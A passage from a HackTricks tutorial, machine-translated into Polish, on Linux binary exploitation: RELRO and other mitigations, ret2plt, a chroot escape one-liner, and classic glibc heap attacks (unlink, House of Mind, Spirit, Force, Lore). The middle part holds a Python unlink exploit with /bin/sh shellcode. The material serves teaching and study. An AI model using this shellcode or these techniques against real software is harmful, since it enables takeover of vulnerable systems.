0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Dla binarnego **bez relro**, możemy zauważyć, że adres wpisu `got` dla `fgets` to `0x404018`. Patrząc na mapowanie pamięci, widzimy, że mieści się między `0x404000` a `0x405000`, co ma **uprawnienia `rw`**, co oznacza, że możemy odczytywać i zapisywać do niego. Dla binarnego **z relro**, widzimy, że adres tabeli `got` dla uruchomienia binarnego (włączony jest `pie`, więc ten adres się zmieni) to `0x555555557fd0`. W mapowaniu pamięci tego binarnego mieści się między `0x0000555555557000` a `0x0000555555558000`, co ma uprawnienia pamięci **`r`**, co oznacza, że możemy tylko odczytywać z niego.

Więc jaki jest **sposób obejścia**? Typowe obejście, które stosuję, to po prostu nie zapisywać do obszarów pamięci, które relro powoduje, że są tylko do odczytu, i **znaleźć inną metodę wykonania kodu**.

Zauważ, że aby to miało miejsce, binarny musi znać wcześniej adresy funkcji:

* Leniwe wiązanie: Adres funkcji jest wyszukiwany za pierwszym razem, gdy funkcja jest wywoływana. Dlatego GOT musi mieć uprawnienia do zapisu podczas wykonywania.
* Wiązanie teraz: Adresy funkcji są rozwiązane na początku wykonania, a następnie sekcjom wrażliwym takim jak .got, .dtors, .ctors, .dynamic, .jcr nadane są uprawnienia tylko do odczytu. `` `** ``-z relro`**`y`**`-z now\`\*\*

Aby sprawdzić, czy program używa Wiązania teraz, można wykonać:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando binarny jest załadowany do pamięci i funkcja jest wywoływana po raz pierwszy, skacze się do PLT (Procedure Linkage Table), skąd następuje skok (jmp) do GOT i odkrywa, że ten wpis nie został rozwiązany (zawiera adres następnej instrukcji z PLT). Następnie Runtime Linker lub rtfd jest wywoływany, aby rozwiązać adres i zapisać go w GOT.

Podczas wywoływania funkcji, PLT jest wywoływane, które zawiera adres GOT, gdzie przechowywany jest adres funkcji, więc przekierowuje przepływ tam i wywołuje funkcję. Jednakże, jeśli jest to pierwsze wywołanie funkcji, GOT zawiera następną instrukcję z PLT, więc przepływ kontynuuje kod z PLT (rtfd) i uzyskuje adres funkcji, zapisuje go w GOT i wywołuje.

Podczas ładowania binarnego do pamięci, kompilator mówi, w jakim przesunięciu należy umieścić dane do załadowania podczas uruchamiania programu.

Lazy binding —> Adres funkcji jest wyszukiwany tylko przy pierwszym wywołaniu tej funkcji, więc GOT ma uprawnienia do zapisu, aby zapisać go tam i nie trzeba było ponownie go szukać.

Bind now —> Adresy funkcji są wyszukiwane podczas ładowania programu, a uprawnienia sekcji .got, .dtors, .ctors, .dynamic, .jcr są zmieniane na tylko do odczytu. **-z relro** i **-z now**

Mimo to, ogólnie programy nie są skomplikowane z tymi opcjami, więc te ataki nadal są możliwe.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** —> Aby sprawdzić, czy używają BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 lub =2**

Stara się zidentyfikować funkcje, które kopiują dane z jednego miejsca do drugiego w sposób niebezpieczny i zamienia funkcję na bezpieczną.

Na przykład:\
char buf\[16];\
strcpy(but, source);

Rozpoznaje to jako niebezpieczne i zamienia strcpy() na \_\_strcpy\_chk(), używając rozmiaru bufora jako maksymalnego rozmiaru do skopiowania.

Różnica między **=1** a **=2** polega na tym, że:

Druga nie pozwala, aby **%n** pochodziło z sekcji z uprawnieniami do zapisu. Ponadto parametr do bezpośredniego dostępu do argumentów może być używany tylko wtedy, gdy używane są wcześniejsze, czyli można użyć **%3$d** tylko jeśli wcześniej użyto **%2$d** i **%1$d**

Aby wyświetlić komunikat o błędzie, używa się argv\[0\], więc jeśli umieścisz tam adres innego miejsca (np. zmiennej globalnej), komunikat o błędzie pokaże zawartość tej zmiennej. Strona 191

**Zastąpienie Libsafe**

Włącza się to za pomocą: LD\_PRELOAD=/lib/libsafe.so.2\
lub\
“/lib/libsave.so.2” > /etc/ld.so.preload

Niektóre niebezpieczne funkcje są zastępowane bezpieczniejszymi. Nie jest to standaryzowane. (tylko dla x86, nie dla kompilacji z -fomit-frame-pointer, nie dla kompilacji statycznych, nie wszystkie funkcje podatne na atak stają się bezpieczne, a LD\_PRELOAD nie działa w binariach z ustawionym suid).

**ASCII Armored Address Space**

Polega na ładowaniu współdzielonych bibliotek od 0x00000000 do 0x00ffffff, aby zawsze był bajt 0x00. Jednakże to praktycznie nie zatrzymuje żadnego ataku, a tym bardziej w little endian.

**ret2plt**

Polega na wykonaniu ROP w taki sposób, że wywoływana jest funkcja strcpy@plt (z plt), a następnie wskazuje się na wpis w GOT i kopiowany jest pierwszy bajt funkcji, do której chcemy się odwołać (system()). Następnie to samo jest robione wskazując na GOT+1 i kopiując 2. bajt system()... Na końcu wywoływany jest zapisany adres w GOT, który będzie system()

**Falso EBP**

Dla funkcji, które używają EBP jako rejestru wskazującego na argumenty, zmieniając EIP i wskazując na system(), EBP również musi zostać zmieniony, aby wskazywał na obszar pamięci zawierający 2 dowolne bajty, a następnie adres do &”/bin/sh”.

**Jaulas con chroot()**

debootstrap -arch=i386 hardy /home/user —> Instaluje podstawowy system w określonym podkatalogu

Administrator może wyjść z takiej klatki wykonując: mkdir foo; chroot foo; cd ..

**Instrumentacja kodu**

Valgrind —> Wyszukuje błędy\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Przepełnienia sterty: Podstawowe ataki**

**Przydzielony kawałek**

prev\_size |\
size | —Nagłówek\
\*mem | Dane

**Wolny kawałek**

prev\_size |\
size |\
\*fd | Wskaźnik do przodu\
\*bk | Wskaźnik do tyłu —Nagłówek\
\*mem | Dane

Wolne kawałki są w liście podwójnie połączonej (bin) i nigdy nie mogą występować dwa wolne kawałki obok siebie (są łączone)

W "size" są bity wskazujące: czy poprzedni kawałek jest używany, czy kawałek został przydzielony za pomocą mmap() i czy kawałek należy do głównego obszaru.

Jeśli zwolniony kawałek ma sąsiednie wolne kawałki, są one łączone za pomocą makra unlink() i nowy, większy kawałek jest przekazywany do frontlink(), aby wstawić go do odpowiedniego binu.

unlink(){\
BK = P->bk; —> BK nowego kawałka to ten, który miał już wcześniej wolny kawałek\
FD = P->fd; —> FD nowego kawałka to ten, który miał już wcześniej wolny kawałek\
FD->bk = BK; —> BK następnego kawałka wskazuje na nowy kawałek\
BK->fd = FD; —> FD poprzedniego kawałka wskazuje na nowy kawałek\
}

Dlatego jeśli uda nam się zmodyfikować P->bk na adres shellcode i P->fd na adres z GOT lub DTORS pomniejszony o 12, osiągniemy:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

W ten sposób po opuszczeniu programu zostanie wykonana shellcode.

Dodatkowo, 4. instrukcja unlink() zapisuje coś, a shellcode musi być dostosowana do tego:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) —> Powoduje to zapisanie 4 bajtów od 8 bajtu shellcode, więc pierwsza instrukcja shellcode musi być skokiem, aby ominąć to i przejść do nops prowadzących do reszty shellcode.

Dlatego exploit jest tworzony:

W buforze1 umieszczamy shellcode zaczynając od skoku, aby przejść do nops lub reszty shellcode.

Po shellcode dodajemy wypełnienie do osiągnięcia pola prev\_size i size następnego kawałka. W tych miejscach umieszczamy 0xfffffff0 (aby nadpisać prev\_size i ustawić bit informujący, że jest wolny) i “-4“(0xfffffffc) w size (aby podczas sprawdzania w 3. kawałku, czy 2. był wolny, faktycznie przejdzie do zmodyfikowanego prev\_size, który powie, że jest wolny) -> Dlatego gdy free() sprawdza, przejdzie do size 3., ale faktycznie przejdzie do 2. - 4 i uzna, że 2. kawałek jest wolny. Następnie zostanie wywołane **unlink()**.

Podczas wywoływania unlink() używa się jako P->fd pierwszych danych z 2. kawałka, więc tam zostanie wstawiony adres do nadpisania - 12 (ponieważ w FD->bk zostanie dodane 12 do adresu przechowywanego w FD). A pod tą adresem wprowadzana jest druga adresem znaleziona w 2. kawałku, która będzie interesująca dla nas jako adres shellcode (fałszywy P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #Ważne, aby bit wskazujący, że poprzedni kawałek jest wolny, był ustawiony na 1**

**fake\_size = pack("\<I”, 0xfffffffc) #-4, aby program myślał, że "size" trzeciego kawałka jest przesunięty o 4 bajty (wskaże na prev\_size), bo tam sprawdza, czy drugi kawałek jest wolny**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Na początku ładujemy 8 bajtów wypełnienia do payloadu**

**got\_free = pack("\<I", 0x08048300 - 12) #Adres free() w plt-12 (będzie nadpisany, aby wykonać shellcode drugi raz, gdy free() zostanie wywołane ponownie)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Jak wspomniano, payload zaczyna się od 8 bajtów wypełnienia**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modyfikujemy drugi kawałek, got\_free wskazuje, gdzie zapiszemy adres addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() zwalniając w odwrotnej kolejności (wargame)**

Kontrolujemy 3 kolejne kawałki i są one zwalniane w odwrotnej kolejności niż rezerwowane.

W tym przypadku:

W kawałku c umieszczamy shellcode

Kawałek a używamy do nadpisania b, aby rozmiar miał wyłączony bit PREV\_INUSE, aby program myślał, że kawałek a jest wolny.

Dodatkowo, nadpisujemy rozmiar w nagłówku b, aby wynosił -4.

W rezultacie program uzna, że "a" jest wolny i w binie, więc wywoła unlink(), aby go odłączyć. Jednakże, ponieważ nagłówek PREV\_SIZE wynosi -4, uzna, że kawałek "a" zaczyna się naprawdę w b+4. Innymi słowy, wywoła unlink() na kawałek, który zaczyna się w b+4, więc w b+12 będzie wskaźnik "fd", a w b+16 będzie wskaźnik "bk".

W ten sposób, jeśli w bk umieścimy adres shellcode, a w fd adres funkcji "puts()"-12, mamy nasz payload.

**Technika Frontlink**

Frontlink jest wywoływany, gdy coś jest zwalniane i żaden z sąsiednich kawałków nie jest wolny, wtedy nie jest wywoływane unlink(), tylko bezpośrednio frontlink().

Użyteczna podatność, gdy atakowany malloc nigdy nie jest zwalniany (free()).

Wymagane:

Bufor, który może zostać przepełniony funkcją wejściową

Bufor sąsiadujący, który zostanie zwolniony, a pole fd w jego nagłówku zostanie zmodyfikowane dzięki przepełnieniu poprzedniego bufora

Bufor do zwolnienia o rozmiarze większym niż 512, ale mniejszym niż poprzedni bufor

Bufor zadeklarowany przed krokiem 3, który pozwala na nadpisanie prev\_size tego bufora

Dzięki temu można nadpisać dwa mallocs w sposób niekontrolowany i jeden w sposób kontrolowany, ale tylko ten jeden jest zwalniany, co pozwala na exploit.

**Podatność double free()**

Jeśli free() jest wywoływane dwa razy z tym samym wskaźnikiem, powstają dwa biny wskazujące na ten sam adres.

Jeśli chcemy ponownie użyć jednego, nie ma problemu. Jeśli chcemy użyć drugiego, zostanie przydzielona ta sama przestrzeń, więc mamy fałszywe wskaźniki "fd" i "bk" z danymi, które zapisze poprzednia rezerwacja.

**After free()**

Wcześniej zwolniony wskaźnik jest ponownie używany bez kontroli.

## **8 Przepełnienia sterty: Zaawansowane exploitacje**

Techniki Unlink() i FrontLink() zostały usunięte po zmianie funkcji unlink().

**The house of mind**

Wystarczy jedno wywołanie free(), aby spowodować wykonanie arbitralnego kodu. Ważne jest znalezienie drugiego kawałka, który może zostać przepełniony przez poprzedni i zwolniony.

Wywołanie free() powoduje wywołanie public\_fREe(mem), co robi:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mes); —> Zwraca wskaźnik na adres początku kawałka (mem-8)

…

ar\_ptr = arena\_for_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

W \[1] sprawdzany jest rozmiar pola bitowego NON\_MAIN\_ARENA, który można zmienić, aby sprawdzenie zwróciło true i wywołało heap\_for\_ptr(), które wykonuje operację and na "mem", ustawiając na 0 2,5 najmniej znaczących bajtów (w naszym przypadku z 0x0804a000 robi 0x08000000) i uzyskuje dostęp do 0x08000000->ar\_ptr (jak do struct heap\_info)

Dlatego jeśli możemy kontrolować kawałek na przykład w 0x0804a000 i kawałek zostanie zwolniony w **0x081002a0**, możemy dotrzeć do adresu 0x08100000 i zapisać, na przykład, **0x0804a000**. Gdy ten drugi kawałek zostanie zwolniony, heap\_for\_ptr(ptr)->ar\_ptr zwróci to, co napisaliśmy w 0x08100000 (ponieważ stosuje się do 0x081002a0 operację and, którą widzieliśmy wcześniej, i stąd wyciąga wartość 4 pierwszych bajtów, ar\_ptr)

W ten sposób zostanie wywołane \_int\_free(ar\_ptr, mem), czyli **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Jak widzieliśmy wcześniej, możemy kontrolować wartość av, ponieważ to, co piszemy w zwalnianym kawałku, jest tym, co zostanie zapisane.

Zgodnie z definicją unsorted\_chunks, wiemy, że:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Dlatego jeśli w av->bins\[2] zapiszemy wartość \_\_DTOR\_END\_\_-12, w ostatniej instrukcji zostanie zapisane w \_\_DTOR\_END\_\_ adres drugiego kawałka.

Innymi słowy, na początku pierwszego kawałka musimy umieścić wiele razy adres \_\_DTOR\_END\_\_-12, ponieważ av->bins\[2] to z niego weźmie.

W miejscu, gdzie znajdzie się adres drugiego kawałka z ostatnimi 5 zerami, musimy zapisać adres tego pierwszego kawałka, aby heap\_for\_ptr() myślał, że ar\_ptr zaczyna się na początku pierwszego kawałka i wyciągnął z niego av->bins\[2]

W drugim kawałku, dzięki pierwszemu, nadpisujemy prev\_size skokiem 0x0c i rozmiarem czegoś, aby aktywować -> NON\_MAIN\_ARENA

Następnie w kawałku 2 umieszczamy mnóstwo nops i na końcu shellcode

W ten sposób zostanie wywołane \_int\_free(KAWAŁEK1, KAWAŁEK2) i będzie postępować zgodnie z instrukcjami, aby zapisać w \_\_DTOR\_END\_\_ adres prev\_size KAWAŁKA2, który skoczy do shellcode.

Aby zastosować tę technikę, należy spełnić kilka dodatkowych wymagań, co trochę komplikuje payload.
Ta technika nie jest już stosowana, ponieważ został zastosowany prawie ten sam patch co dla unlink. Sprawdzane jest, czy nowa lokalizacja, do której się odwołuje, również odwołuje się do niej.

**Fastbin**

To wariant The House of Mind

Interesuje nas wykonanie następującego kodu, do którego dochodzi po pierwszej weryfikacji funkcji \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] —> Gdzie fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

W ten sposób, jeśli umieścimy w "fb" adres funkcji w GOT, pod tym adresem umieszczony zostanie adres nadpisanej części. Aby to osiągnąć, konieczne jest, aby arena była blisko adresów dtors. Dokładniej mówiąc, av->max\_fast musi znajdować się pod adresem, który zamierzamy nadpisać.

Ponieważ w The House of Mind zauważono, że kontrolowaliśmy pozycję av.

Jeśli więc w polu size podamy rozmiar 8 + NON\_MAIN\_ARENA + PREV\_INUSE —> fastbin\_index() zwróci fastbins\[-1\], który wskaże na av->max\_fast

W tym przypadku av->max\_fast będzie adresem, który zostanie nadpisany (nie ten, do którego wskazuje, ale ta pozycja zostanie nadpisana).

Ponadto musi być spełniony warunek, że fragment obok zwolnionego musi być większy niż 8 -> Ponieważ powiedzieliśmy, że rozmiar zwolnionego fragmentu to 8, w tym fałszywym fragmencie wystarczy umieścić rozmiar większy niż 8 (ponieważ shellcode będzie w zwolnionym fragmencie, na początku trzeba umieścić skok, który trafi w nopy).

Ponadto ten sam fałszywy fragment musi być mniejszy niż av->system\_mem. av->system\_mem znajduje się 1848 bajtów dalej.

Z powodu zer w \_DTOR\_END\_ i niewielu adresów w GOT, żaden z tych sektorów nie nadaje się do nadpisania, zobaczmy więc, jak zastosować fastbin do ataku na stos.

Innym sposobem ataku jest przekierowanie **av** na stos.

Jeśli zmienimy rozmiar na 16 zamiast 8, wtedy: fastbin\_index() zwróci fastbins\[0\] i możemy tego użyć do nadpisania stosu.

W tym celu nie powinno być żadnych canary ani dziwnych wartości na stosie, faktycznie musimy znaleźć się w takim miejscu: 4 bajty zerowe + EBP + RET

4 bajty zerowe są potrzebne, aby **av** znajdował się pod tym adresem, a pierwszy element **av** to mutex, który musi wynosić 0.

**av->max\_fast** będzie EBP i będzie wartością, która pozwoli nam ominąć ograniczenia.

W **av->fastbins\[0\]** zostanie nadpisany adresem **p** i będzie RET, dzięki czemu nastąpi skok do shellcode.

Ponadto w **av->system\_mem** (1484 bajty powyżej pozycji na stosie) będzie dużo śmieci, które pozwolą nam ominąć sprawdzanie.

Ponadto musi być spełniony warunek, że fragment obok zwolnionego musi być większy niż 8 -> Ponieważ powiedzieliśmy, że rozmiar zwolnionego fragmentu to 16, w tym fałszywym fragmencie wystarczy umieścić rozmiar większy niż 8 (ponieważ shellcode będzie w zwolnionym fragmencie, na początku trzeba umieścić skok, który trafi w nopy, które znajdują się po polu size nowego fałszywego fragmentu).

**The House of Spirit**

W tym przypadku chcemy mieć wskaźnik do malloc, który może być modyfikowany przez atakującego (np. wskaźnik znajduje się na stosie pod potencjalnym przepełnieniem zmiennej).

W ten sposób możemy sprawić, że ten wskaźnik wskazuje dokądkolwiek. Jednak nie każde miejsce jest odpowiednie, rozmiar fałszywego fragmentu musi być mniejszy niż av->max\_fast i bardziej konkretne, równy rozmiarowi żądanemu w przyszłym wywołaniu malloc()+8. Dlatego jeśli wiemy, że po tym podatnym wskaźniku następuje wywołanie malloc(40), rozmiar fałszywego fragmentu musi wynosić 48.

Na przykład, jeśli program pyta użytkownika o liczbę, możemy wprowadzić 48 i skierować modyfikowalny wskaźnik malloc na następne 4 bajty (które mogą należeć do EBP, a więc 48 pozostaje z tyłu, jakby to była nagłówek rozmiaru). Ponadto, adres ptr-4+48 musi spełniać kilka warunków (w tym przypadku ptr=EBP), czyli 8 < ptr-4+48 < av->system\_mem.

Jeśli to się spełni, gdy zostanie wywołany kolejny malloc, który powiedzieliśmy, że to malloc(40), zostanie mu przypisany adres EBP. Jeśli atakujący może również kontrolować to, co jest zapisywane w tym malloc, może nadpisać zarówno EBP, jak i EIP dowolnym adresem.

Wygląda na to, że dlatego, gdy zostanie zwolniony free(), zostanie zapisane, że w miejscu wskazującym na EBP stosu znajduje się fragment o idealnym rozmiarze dla nowego malloc(), który chce zarezerwować, więc przypisuje mu ten adres.

**The House of Force**

Wymagane jest:

* Przepełnienie fragmentu, które pozwala na nadpisanie wilderness
* Wywołanie malloc() z rozmiarem zdefiniowanym przez użytkownika
* Wywołanie malloc(), których dane mogą być zdefiniowane przez użytkownika

Najpierw należy nadpisać rozmiar fragmentu wilderness bardzo dużą wartością (0xffffffff), dzięki czemu każde żądanie pamięci wystarczająco duże będzie obsługiwane w \_int\_malloc() bez konieczności rozszerzania sterty.

Następnie zmieniamy av->top, aby wskazywał na obszar pamięci pod kontrolą atakującego, tak jak stos. W av->top umieszczamy \&EIP - 8.

Musimy nadpisać av->top, aby wskazywał na obszar pamięci pod kontrolą atakującego:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim przechwytuje adres bieżącego obszaru wilderness (aktualny av->top), a remainder to dokładnie suma tego adresu plus ilość bajtów żądanych przez malloc(). Dlatego jeśli \&EIP-8 znajduje się pod adresem 0xbffff224, a av->top zawiera 0x080c2788, to ilość, którą musimy zarezerwować w kontrolowanym malloc, aby av->top wskazywał na $EIP-8 dla następnego malloc(), wynosi:

0xbffff224 - 0x080c2788 = 3086207644.

W ten sposób zostanie zapisana zmieniona wartość w av->top, a następny malloc wskaże na EIP i będzie można go nadpisać.

Ważne jest, aby rozmiar nowego obszaru wilderness był większy niż żądanie ostatniego malloc(). Innymi słowy, jeśli wilderness wskazuje na \&EIP-8, rozmiar zostanie dokładnie w polu EBP stosu.

**The House of Lore**

**Corrupción SmallBin**

Zwolnione fragmenty są umieszczane w bin w zależności od ich rozmiaru. Ale zanim zostaną umieszczone, są przechowywane w nieuporządkowanych binach. Fragment nie jest natychmiast umieszczany w swoim binie, ale pozostaje w nieuporządkowanych binach. Następnie, jeśli zostanie zarezerwowany nowy fragment i poprzedni zwolniony może być użyty, zostanie on zwrócony, ale jeśli zostanie zarezerwowany większy, zwolniony fragment w nieuporządkowanych binach zostanie umieszczony w odpowiednim binie.

Aby osiągnąć podatny kod, żądanie pamięci musi być większe niż av->max\_fast (zazwyczaj 72) i mniejsze niż MIN\_LARGE\_SIZE (512).

Jeśli w binie znajduje się fragment o odpowiednim rozmiarze, zostanie on zwrócony po odłączeniu:

bck = victim->bk; Wskaże poprzedni fragment, to jedyna informacja, którą możemy zmienić.

bin->bk = bck; Przedostatni fragment staje się ostatnim, jeśli bck wskazuje na stos, następnemu zarezerwowanemu fragmentowi zostanie przypisany ten adres

bck->fd = bin; Lista zostaje zamknięta, wskazując na bin

Wymagane jest:
Zarezerwuj dwie pamięci malloc, tak aby pierwsza mogła zostać przepełniona po zwolnieniu drugiej i umieszczeniu jej w swoim binie (czyli zarezerwowano malloc większy niż drugi kawałek przed przepełnieniem).

Zarezerwowana pamięć, do której atakujący wybiera adres, jest kontrolowana przez atakującego.

Celem jest, jeśli możemy przepełnić stertę, która ma zwolniony kawałek poniżej i znajduje się w jego binie, możemy zmienić wskaźnik bk. Jeśli zmienimy wskaźnik bk i ten kawałek stanie się pierwszy na liście binów i zostanie zarezerwowany, oszukamy bin i powiemy mu, że następny kawałek na liście (następny do zaoferowania) znajduje się pod fałszywym adresem, który podaliśmy (na przykład na stosie lub GOT). W ten sposób, jeśli zostanie zarezerwowany kolejny kawałek i atakujący ma uprawnienia do niego, zostanie mu przydzielony kawałek na żądanej pozycji i będzie mógł w nią pisać.

Po zwolnieniu zmodyfikowanego kawałka konieczne jest zarezerwowanie większego kawałka niż zwolniony, aby zmodyfikowany kawałek wyszedł z nieuporządkowanych binów i został umieszczony w swoim binie.

Gdy już znajdzie się w swoim binie, należy zmienić mu wskaźnik bk poprzez przepełnienie, aby wskazywał na adres, który chcemy nadpisać.

Następnie bin musi poczekać, aż malloc() zostanie wywołane wystarczająco wiele razy, aby ponownie użyć zmodyfikowanego bina i oszukać bin, sprawiając, że uwierzy, że następny kawałek znajduje się pod fałszywym adresem. Następnie zostanie przydzielony kawałek, który nas interesuje.

Aby wywołać podatność jak najszybciej, idealne jest: zarezerwowanie podatnego kawałka, zarezerwowanie kawałka do zmodyfikowania, zwolnienie tego kawałka, zarezerwowanie większego kawałka niż ten, który zostanie zmodyfikowany, zmodyfikowanie kawałka (podatność), zarezerwowanie kawałka o takim samym rozmiarze co naruszony i zarezerwowanie drugiego kawałka o takim samym rozmiarze, który będzie wskazywał na wybrany adres.

Aby zabezpieczyć się przed tym atakiem, używa się standardowej weryfikacji, czy kawałek "nie" jest fałszywy: sprawdza się, czy bck->fd wskazuje na ofiarę. Innymi słowy, w naszym przypadku, jeśli wskaźnik fd\* fałszywego kawałka wskazuje na ofiarę na stosie. Aby ominąć to zabezpieczenie, atakujący musiałby być w stanie w jakiś sposób (prawdopodobnie przez stos) zapisać odpowiednio adres ofiary. W ten sposób wyglądałoby to jak prawdziwy kawałek.

**Korupcja LargeBin**

Wymagane są te same warunki co wcześniej i kilka dodatkowych, ponadto zarezerwowane kawałki muszą być większe niż 512.

Atak jest podobny do poprzedniego, czyli trzeba zmienić wskaźnik bk i potrzebne są wszystkie te wywołania malloc(), ale dodatkowo trzeba zmienić rozmiar zmodyfikowanego kawałka tak, aby ten rozmiar - nb był < MINSIZE.

Na przykład, trzeba ustawić rozmiar na 1552, aby 1552 - 1544 = 8 < MINSIZE (odejmowanie nie może być ujemne, ponieważ porównuje się liczby bez znaku)

Dodatkowo wprowadzono łatkę, aby sprawić, że atak będzie jeszcze trudniejszy.

**Rozpylanie sterty (Heap Spraying)**

Polega na zarezerwowaniu jak największej ilości pamięci dla sterty i wypełnieniu jej poduszką z nops zakończoną shellcodem. Dodatkowo jako poduszkę używa się 0x0c. Następnie próbuje się skoczyć do adresu 0x0c0c0c0c, więc jeśli jakaś adres zostanie nadpisany tymi poduszkami, skoczy tam. Podstawową taktyką jest zarezerwowanie jak największej ilości pamięci, aby zobaczyć, czy jakiś wskaźnik zostanie nadpisany, i skok do 0x0c0c0c0c w nadziei, że tam będą nops.

**Feng Shui sterty (Heap Feng Shui)**

Polega na utwardzaniu pamięci poprzez rezerwacje i zwalnianie, tak aby między wolnymi kawałkami pozostały zarezerwowane kawałki. Bufor do przepełnienia zostanie umieszczony w jednym z tych kawałków.

## Ciekawe kursy

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referencje**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
